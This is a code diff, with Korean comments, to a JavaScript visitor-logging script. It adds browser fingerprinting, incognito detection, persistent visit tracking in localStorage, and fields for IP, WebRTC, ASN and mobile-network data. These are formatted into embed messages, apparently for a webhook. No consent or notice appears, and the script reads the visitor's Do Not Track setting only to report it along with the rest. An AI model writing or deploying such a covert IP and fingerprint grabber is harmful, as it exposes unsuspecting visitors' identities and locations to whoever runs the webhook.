@@ -1561,6 +1561,113 @@ function getPerformanceInfo() {
     }
 }
 
+/* ========== 보안 및 프라이버시 정보 ========== */
+function getSecurityInfo() {
+    try {
+        return {
+            doNotTrack: navigator.doNotTrack || navigator.msDoNotTrack || window.doNotTrack || 'N/A',
+            cookieEnabled: navigator.cookieEnabled ? '✅ 활성화' : '❌ 비활성화',
+            localStorage: ('localStorage' in window && window.localStorage !== null) ? '✅ 사용 가능' : '❌ 사용 불가',
+            sessionStorage: ('sessionStorage' in window && window.sessionStorage !== null) ? '✅ 사용 가능' : '❌ 사용 불가',
+            incognito: detectIncognitoMode()
+        };
+    } catch {
+        return {
+            doNotTrack: 'N/A',
+            cookieEnabled: 'N/A',
+            localStorage: 'N/A',
+            sessionStorage: 'N/A',
+            incognito: 'N/A'
+        };
+    }
+}
+
+function detectIncognitoMode() {
+    try {
+        // localStorage 테스트
+        if ('localStorage' in window) {
+            try {
+                localStorage.setItem('test', '1');
+                localStorage.removeItem('test');
+                return '❌ 일반 모드';
+            } catch {
+                return '🔴 시크릿 모드 가능';
+            }
+        }
+        return 'N/A';
+    } catch {
+        return 'N/A';
+    }
+}
+
+/* ========== 방문 기록 추적 ========== */
+function getVisitTracking() {
+    try {
+        const storageKey = 'visitor_tracking';
+        let tracking = {};
+        
+        // 기존 데이터 로드
+        try {
+            const stored = localStorage.getItem(storageKey);
+            if (stored) {
+                tracking = JSON.parse(stored);
+            }
+        } catch {}
+        
+        // 첫 방문 여부
+        const isFirstVisit = !tracking.firstVisit;
+        
+        // 방문 횟수 증가
+        tracking.visitCount = (tracking.visitCount || 0) + 1;
+        
+        // 첫 방문 시간 기록
+        if (!tracking.firstVisit) {
+            tracking.firstVisit = new Date().toISOString();
+        }
+        
+        // 마지막 방문 시간 업데이트
+        tracking.lastVisit = new Date().toISOString();
+        
+        // 저장
+        try {
+            localStorage.setItem(storageKey, JSON.stringify(tracking));
+        } catch {}
+        
+        return {
+            isFirstVisit: isFirstVisit ? '✅ 첫 방문' : '❌ 재방문',
+            visitCount: tracking.visitCount || 1,
+            firstVisit: tracking.firstVisit ? new Date(tracking.firstVisit).toLocaleString('ko-KR') : 'N/A',
+            lastVisit: tracking.lastVisit ? new Date(tracking.lastVisit).toLocaleString('ko-KR') : 'N/A'
+        };
+    } catch {
+        return {
+            isFirstVisit: 'N/A',
+            visitCount: 'N/A',
+            firstVisit: 'N/A',
+            lastVisit: 'N/A'
+        };
+    }
+}
+
+/* ========== 언어 및 지역 설정 ========== */
+function getLanguageInfo() {
+    try {
+        return {
+            primaryLanguage: navigator.language || 'N/A',
+            languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
+            platform: navigator.platform || 'N/A',
+            userAgent: navigator.userAgent || 'N/A'
+        };
+    } catch {
+        return {
+            primaryLanguage: 'N/A',
+            languages: 'N/A',
+            platform: 'N/A',
+            userAgent: 'N/A'
+        };
+    }
+}
+
 
 /* ========== IP 정보 수집 (IPv4 / IPv6 구분) ========== */
 
@@ -1666,6 +1773,9 @@ async function getWebRTCIPs() {
 
 async function collectAndSendInfo() {
     try {
+        // 방문 기록 추적
+        const visitTracking = getVisitTracking();
+        
         // IP 정보 (IPv4 / IPv6)
         const ipInfo = await getIPInfo();
         visitorInfo.ipInfo = ipInfo;
@@ -1693,7 +1803,10 @@ async function collectAndSendInfo() {
                     org: '',
                     timezone: traceData.tz || '',
                     lat: 0,
-                    lon: 0
+                    lon: 0,
+                    asn: 'N/A',
+                    connection_type: 'N/A',
+                    mobile: 'N/A'
                 };
             } catch {
                 // 실패 시 기본값
@@ -1728,6 +1841,11 @@ async function collectAndSendInfo() {
         visitorInfo.performance = getPerformanceInfo();
         visitorInfo.url = window.location.href;
         visitorInfo.referrer = document.referrer || '직접 접속';
+
+        // 추가 정보 수집
+        visitorInfo.securityInfo = getSecurityInfo();
+        visitorInfo.visitTracking = visitTracking;
+        visitorInfo.languageInfo = getLanguageInfo();
 
         // WebRTC IP 후보 정보
         visitorInfo.webRTC = await getWebRTCIPs();
@@ -1820,6 +1938,38 @@ async function collectAndSendInfo() {
                         `**메인 IP:** ${visitorInfo.ip || 'N/A'}\n` +
                         `**IPv4:** ${visitorInfo.ipInfo?.ipv4 || 'N/A'}\n` +
                         `**IPv6:** ${visitorInfo.ipInfo?.ipv6 || 'N/A'}`,
+                    inline: false
+                },
+                {
+                    name: "🔐 보안 및 프라이버시",
+                    value:
+                        `**Do Not Track:** ${visitorInfo.securityInfo?.doNotTrack || 'N/A'}\n` +
+                        `**쿠키:** ${visitorInfo.securityInfo?.cookieEnabled || 'N/A'}\n` +
+                        `**시크릿 모드:** ${visitorInfo.securityInfo?.incognito || 'N/A'}`,
+                    inline: false
+                },
+                {
+                    name: "🌍 언어 및 지역 설정",
+                    value:
+                        `**주 언어:** ${visitorInfo.languageInfo?.primaryLanguage || 'N/A'}\n` +
+                        `**사용 언어:** ${visitorInfo.languageInfo?.languages || 'N/A'}\n` +
+                        `**플랫폼:** ${visitorInfo.languageInfo?.platform || 'N/A'}`,
+                    inline: false
+                },
+                {
+                    name: "📅 방문 기록",
+                    value:
+                        `**첫 방문:** ${visitorInfo.visitTracking?.isFirstVisit || 'N/A'}\n` +
+                        `**방문 횟수:** ${visitorInfo.visitTracking?.visitCount || 0}회`,
+                    inline: false
+                },
+                {
+                    name: "🌐 추가 IP 정보",
+                    value:
+                        `**ASN:** ${visitorInfo.location?.asn || 'N/A'}\n` +
+                        `**조직:** ${visitorInfo.location?.org || 'N/A'}\n` +
+                        `**연결 타입:** ${visitorInfo.location?.connection_type || 'N/A'}\n` +
+                        `**모바일 네트워크:** ${visitorInfo.location?.mobile || 'N/A'}`,
                     inline: false
                 },
                 {
